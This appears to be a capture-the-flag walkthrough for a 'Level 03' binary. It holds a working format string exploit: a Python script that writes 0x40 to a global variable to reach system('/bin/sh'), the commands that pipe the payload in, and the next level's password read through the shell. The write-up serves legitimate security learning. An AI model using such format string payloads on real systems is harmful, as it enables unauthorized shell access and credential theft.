# Level 03 Walkthrough

## Binary analysis

The binary is vulnerable to a format string attack. The global variable `m` (address: 0x0804988c) must be set to 0x40 to trigger the call to `system("/bin/sh")`.

Relevant code:
```
080484c7        char buffer[0x208]
080484c7        fgets(buf: &buffer, n: 0x200, fp: stdin)
080484d5        printf(format: &buffer)
080484da        uint32_t m_1 = m
080484e2        if (m_1 != 0x40)
08048519            return m_1
08048507        fwrite(buf: "Wait what?!\n", size: 1, count: 0xc, fp: stdout)
08048513        return system(line: "/bin/sh")
```

## Exploitation

We use a format string payload to write 0x40 into the global variable `m`.

Python script to generate the payload:
```python
import struct
m_addr = 0x0804988c
offset = 4
payload = struct.pack("<I", m_addr)
payload += b"%60x"
payload += f"%{offset}$n".encode('ascii')
with open('payload.txt', 'wb') as f:
    f.write(payload)
```

## Commands used

```
cat /tmp/payload.txt - | ./level3
ls
cat /home/user/level4/.pass
```

## Result

After running the exploit, we get a shell as level4 and can read the password:

```
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

Copy the password for the next level. 